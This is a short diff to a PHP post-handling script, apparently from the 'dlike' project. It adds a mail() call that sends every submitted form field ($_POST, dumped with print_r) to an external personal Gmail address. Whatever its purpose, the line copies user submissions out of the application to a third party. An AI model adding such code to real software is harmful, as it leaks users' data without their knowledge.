@@ -8,6 +8,8 @@ include('../functions/main.php');
 
 $postGenerator = new dlike\post\makePost();
 
+mail("jaihind530@gmail.com","tags fromdlike",print_r($_POST,true));
+
 	$url = $_POST['exturl'];
 	$urlImage = $_POST["image"];
 	$title = $_POST['title'];
